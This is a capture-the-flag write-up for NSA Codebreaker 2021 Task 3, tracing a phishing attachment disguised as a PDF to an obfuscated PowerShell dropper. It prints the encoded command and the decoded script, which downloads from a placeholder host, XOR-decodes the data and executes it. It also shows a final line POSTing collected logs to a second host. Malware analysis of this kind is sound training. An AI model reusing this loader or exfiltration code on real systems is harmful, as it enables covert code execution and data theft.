---
layout: page
title: About
permalink: /NSA-Codebreaker-2021/task3.md
---

This is a write up by a partner I had for this CTF: @seththegardner on github

### First Insights

At this point in the investigation we know that a machine associated with *Online Operations and Production Servicest (OOPS)* company has communicated with the foreign Listening Post. From the previous task, we were able to identify the employee associated with the account on the machine. During an incident response interview, the user mentioned that they were checking email around the time that the communication occured. They stated that they did not remember anything weird that occured while checking email. The led OOPS to provide us with a subset of the user's inbox from the day of the incident.

### Beginning the Investigation

Starting with the provided collection of 24 emails, the inital thought was to check the content of the emails for malicious links or files. Two examples of suspected emails are contained within this task's directory. After checking the links contained in emails, there was no lead to a malicious actor as there domain of the links did not match the Wireshark capture from Task 1. The next step was to identify an email with a malicious attachment. After doing research on [email attachments](https://en.wikipedia.org/wiki/Email_attachment), it was found that the files are encoded in Base64 and malware is commonly attached, pointing us in the correct direction.

### Decoding the attachments

Given that any of the emails containing attachments are suspect, this quickly became a process of elimination. Going through the emails that contianed attachments, the files were decoded using an online [Base64 Decoder](https://www.base64decode.org/). After decoding a lot of pictures of puppies and meeting powerpoints, a lead was finally found. The attachment in *message_16* (see in repo directory), claiming to be a PDF guide to installing/using FOOT was found to contain a powershell script. Below is a snippit of the decoded "PDF".

```powershell
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AcgBvAGsAdwB6AC4AaQBuAHYAYQBsAGkAZAAvAHMAZQBjAHUAcgBpAHQAeQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADkAMAAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
```

### Understaing the Script

There were a few inital questions that presented themselves after seeing the malicious script. First being, what are these flags and what is this gibberish? After looking into [powershell flags](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1), it was concluded that the *-nop, -noni* and *-w Hidden* flags were unimportant to understand what this script was doing. The most imporatant flag was the *-enc or EncodedCommand* flag and the corresponding encoded text. Moving forward, the obvious step was to decode the encoded part of the script to see what was going on behind the curtain of obfusication. Decoding the script using the same online Base64 Decoder above, we were faced with an addition to the script, obviously malicious...

```powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://rokwz.invalid/security')

$prev = [byte] 90

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

At this point it was confirmed that this was the malicious script that was ran while the employee was browsing their email. This is because the first line of the script makes an HTTP call to *http://rokwz.invalid/security*, matching the call seen in the Wireshark capture in Task 1. You might think we found what this script was doing, right? No it is not... we were tasked with finding the domain that the script made a POST request to and the DownloadData() function is an HTTP GET request.

### Downloading the Data

From the Task's description, we needed to go farther to discover a domian that the script was sending a POST request to. The only option to get there was to execute this script, but we don't want to make a call to the malicious actor's endpoint, so a modified script needed to be made to mimick the real script's functionality. This called for two steps: one, getting the endpoint data without making and HTTP call and two, changing the scipt to not execute the mystery code that is being downloaded. Luckily for us, the first step was already solved as the data from the request was captured in the .pcap file from Task 1 as seen below. 

![image](https://user-images.githubusercontent.com/94944325/145699900-e5d7dc08-488b-4039-83a8-646b5660a5a5.png)

Now that we got the data downloaded from the malicious actor's domain, we needed to modify the script to make sure no malicious code was execute on our machine. As seen in the last line of the script above, there is an *iex()* function being used. This function executes a string (presumably malware) constructed in the for-loop above. Our new script needed to remove that functionality and instead print the string that is attempting to be executed. The modified script is seen below, along with the output when runnning it. 
**Note the $hexString variable containing the data from the GET request is left out as it is over 12,000 bytes.**

```powershell
$hexString = ''
$bytes = [byte[]]::new($hexString.Length/2)

for($i=0; $i -lt $hexString.Length; $i +=2){
	$bytes[$i/2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
}
$bytes

$prev = [byte] 90

$dec = $(for($i = 0; $i -lt $bytes.length; $i++){
	$prev = $bytes[$i] -bxor $prev
	$prev
})

Write-Output $dec
[System.Text.Encoding]::UTF8.GetString($dec)
pause
```
Output of the script
**Note: The guts of this script was left out for the sake of this file's readability. The script will be explored in Task 4**

```powershell
$global:log = ""
...
...
...
Invoke-WebRequest -uri http://rlwmw.invalid:8080 -Method Post -Body $global:log
```

### Finding the POST

After running our modified script, we found that there was yet another script constructed and executed from the downloaded data. The extent of this task required us to find the POST request and lo and behold, that request is seen in the last line of the script, POSTing data to *http://rlwmw.invalid:8080*

Author: 

@seththegardner

Editor:

Hourglass aka Me
